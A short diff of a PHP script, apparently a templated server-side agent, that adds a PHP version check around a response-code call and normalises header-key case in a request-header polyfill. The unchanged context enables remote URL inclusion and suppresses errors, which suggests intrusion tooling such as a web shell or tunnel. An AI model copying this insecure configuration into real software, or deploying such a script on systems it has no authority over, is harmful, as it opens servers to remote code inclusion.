@@ -3,7 +3,7 @@ ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
 error_reporting(E_ERROR | E_PARSE);
 
-@http_response_code(HTTPCODE);
+if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
 
 if( !function_exists('apache_request_headers') ) {
     function apache_request_headers() {
@@ -22,7 +22,7 @@ if( !function_exists('apache_request_headers') ) {
 
                     $arh_key = implode('-', $rx_matches);
                 }
-                $arh[$arh_key] = $val;
+                $arh[ucwords(strtolower($arh_key))] = $val;
             }
         }
         return($arh);
